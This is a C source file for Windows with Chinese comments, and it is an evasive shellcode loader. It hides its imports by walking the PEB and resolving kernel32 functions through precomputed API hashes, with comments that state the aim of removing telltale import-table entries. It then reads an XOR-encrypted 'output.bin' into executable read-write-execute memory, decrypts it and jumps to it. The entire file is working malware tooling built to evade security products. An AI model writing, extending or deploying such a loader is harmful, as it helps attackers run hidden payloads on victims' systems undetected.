#include <windows.h>
#include <stdio.h>
#include <winternl.h>

// ========== 方案4: API哈希 — 隐藏导入表 ==========
#define INITIAL_SEED 7

DWORD HASHA(const char* String) {
    SIZE_T Index = 0;
    DWORD Hash = 0;
    SIZE_T Length = lstrlenA(String);

    while (Index != Length) {
        Hash += String[Index++];
        Hash += Hash << INITIAL_SEED;
        Hash ^= Hash >> 6;
    }
    Hash += Hash << 3;
    Hash ^= Hash >> 11;
    Hash += Hash << 15;
    return Hash;
}

HMODULE GetModuleHandleH(DWORD dwModuleNameHash) {
#ifdef _WIN64
    PPEB pPeb = (PEB*)(__readgsqword(0x60));
#else
    PPEB pPeb = (PEB*)(__readfsdword(0x30));
#endif
    PPEB_LDR_DATA pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);
    PLDR_DATA_TABLE_ENTRY pDte =
        (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);

    while (pDte) {
        if (pDte->FullDllName.Length != NULL && pDte->FullDllName.Length < MAX_PATH * 2) {
            // 从完整路径中提取纯文件名（跳过最后一个反斜杠）
            WCHAR* pFullName = pDte->FullDllName.Buffer;
            WCHAR* pFileName = pFullName;
            for (DWORD j = 0; pFullName[j] != L'\0'; j++) {
                if (pFullName[j] == L'\\' || pFullName[j] == L'/')
                    pFileName = &pFullName[j + 1];
            }

            CHAR UpperCaseDllName[MAX_PATH];
            DWORD i = 0;
            while (pFileName[i] && i < MAX_PATH - 1) {
                UpperCaseDllName[i] = (CHAR)toupper(pFileName[i]);
                i++;
            }
            UpperCaseDllName[i] = '\0';

            if (HASHA(UpperCaseDllName) == dwModuleNameHash)
                return (HMODULE)pDte->Reserved2[0];
        } else {
            break;
        }
        pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);
    }
    return NULL;
}

FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash) {
    PBYTE pBase = (PBYTE)hModule;

    PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;
    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

    PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);
    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE) return NULL;

    PIMAGE_EXPORT_DIRECTORY pImgExportDir =
        (PIMAGE_EXPORT_DIRECTORY)(pBase + pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    PDWORD FunctionNameArray    = (PDWORD)(pBase + pImgExportDir->AddressOfNames);
    PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);
    PWORD  FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);

    for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {
        CHAR* pFunctionName   = (CHAR*)(pBase + FunctionNameArray[i]);
        PVOID pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);

        if (dwApiNameHash == HASHA(pFunctionName)) {
            return (FARPROC)pFunctionAddress;
        }
    }
    return NULL;
}

// ========== 函数指针类型定义（隐藏 IAT 中的敏感 API） ==========
typedef HANDLE (WINAPI *pCreateFileA)(
    LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef DWORD  (WINAPI *pGetFileSize)(HANDLE, LPDWORD);
typedef LPVOID (WINAPI *pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL   (WINAPI *pReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL   (WINAPI *pVirtualFree)(LPVOID, SIZE_T, DWORD);
typedef BOOL   (WINAPI *pCloseHandle)(HANDLE);
typedef BOOL   (WINAPI *pFlushInstructionCache)(HANDLE, LPCVOID, SIZE_T);
typedef HANDLE (WINAPI *pGetCurrentProcess)();
typedef DWORD  (WINAPI *pGetLastError)();

// ========== API 哈希常量（编译时已预计算） ==========
#define KERNEL32DLL_HASH          0x367DC15A
#define CREATEFILEA_HASH          0x941AAD00
#define GETFILESIZE_HASH          0xE4EDD918
#define VIRTUALALLOC_HASH         0xF625556A
#define READFILE_HASH             0x6D0D0E8F
#define VIRTUALFREE_HASH          0xE2CA922F
#define CLOSEHANDLE_HASH          0xE288B704
#define FLUSHINSTRUCTIONCACHE_HASH 0x4A2EC7BC
#define GETCURRENTPROCESS_HASH    0x26C2CE8D
#define GETLASTERROR_HASH         0x9BAD53DD

// 禁用优化确保解密函数不被编译器优化掉
#pragma optimize("", off)
void xor_decrypt(BYTE* data, DWORD size, BYTE key) {
    for (DWORD i = 0; i < size; i++) {
        data[i] ^= key;
    }
}
#pragma optimize("", on)

int main() {
    const char* filename = "output.bin";
    const BYTE xorKey = 0xAA; // 必须与加密密钥一致

    // ========== 方案4: API哈希动态加载，消除 IAT 特征 ==========
    HMODULE hKernel32 = GetModuleHandleH(KERNEL32DLL_HASH);
    if (!hKernel32) {
        printf("[!] 获取 kernel32.dll 句柄失败\n");
        return 1;
    }

    pCreateFileA           _CreateFileA           = (pCreateFileA)          GetProcAddressH(hKernel32, CREATEFILEA_HASH);
    pGetFileSize           _GetFileSize           = (pGetFileSize)          GetProcAddressH(hKernel32, GETFILESIZE_HASH);
    pVirtualAlloc          _VirtualAlloc          = (pVirtualAlloc)         GetProcAddressH(hKernel32, VIRTUALALLOC_HASH);
    pReadFile              _ReadFile              = (pReadFile)             GetProcAddressH(hKernel32, READFILE_HASH);
    pVirtualFree           _VirtualFree           = (pVirtualFree)          GetProcAddressH(hKernel32, VIRTUALFREE_HASH);
    pCloseHandle           _CloseHandle           = (pCloseHandle)          GetProcAddressH(hKernel32, CLOSEHANDLE_HASH);
    pFlushInstructionCache _FlushInstructionCache = (pFlushInstructionCache)GetProcAddressH(hKernel32, FLUSHINSTRUCTIONCACHE_HASH);
    pGetCurrentProcess     _GetCurrentProcess     = (pGetCurrentProcess)    GetProcAddressH(hKernel32, GETCURRENTPROCESS_HASH);
    pGetLastError          _GetLastError          = (pGetLastError)         GetProcAddressH(hKernel32, GETLASTERROR_HASH);

    if (!_CreateFileA || !_GetFileSize || !_VirtualAlloc || !_ReadFile ||
        !_VirtualFree || !_CloseHandle || !_FlushInstructionCache ||
        !_GetCurrentProcess || !_GetLastError) {
        printf("[!] 动态加载 API 失败\n");
        return 1;
    }

    // 1. 打开加密文件
    HANDLE hFile = _CreateFileA(
        filename,
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[!] 无法打开 %s (错误: 0x%lX)\n", filename, _GetLastError());
        return 1;
    }

    // 2. 获取文件大小
    DWORD fileSize = _GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE) {
        printf("[!] 获取文件大小失败 (错误: 0x%lX)\n", _GetLastError());
        _CloseHandle(hFile);
        return 1;
    }

    // 3. 分配可执行内存
    LPVOID shellcode = _VirtualAlloc(
        NULL,
        fileSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (!shellcode) {
        printf("[!] 内存分配失败 (错误: 0x%lX)\n", _GetLastError());
        _CloseHandle(hFile);
        return 1;
    }

    // 4. 读取加密内容
    DWORD bytesRead;
    if (!_ReadFile(hFile, shellcode, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
        printf("[!] 读取失败 (错误: 0x%lX)\n", _GetLastError());
        _VirtualFree(shellcode, 0, MEM_RELEASE);
        _CloseHandle(hFile);
        return 1;
    }
    _CloseHandle(hFile);

    // 5. 解密shellcode
    printf("[+] 解密Shellcode (大小: %lu bytes, 密钥: 0x%02X)...\n", fileSize, xorKey);
    xor_decrypt((BYTE*)shellcode, fileSize, xorKey);

    // 6. 确保指令缓存刷新
    _FlushInstructionCache(_GetCurrentProcess(), shellcode, fileSize);

    // 7. 执行shellcode
    printf("[+] 执行Shellcode (地址: 0x%p)...\n", shellcode);

    __try {
        // 直接调用shellcode
        ((void(*)())shellcode)();
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        printf("[!] Shellcode执行异常 (代码: 0x%lX)\n", GetExceptionCode());
        _VirtualFree(shellcode, 0, MEM_RELEASE);
        return 1;
    }

    // 8. 清理
    _VirtualFree(shellcode, 0, MEM_RELEASE);
    printf("[+] 执行完成\n");

    return 0;
}
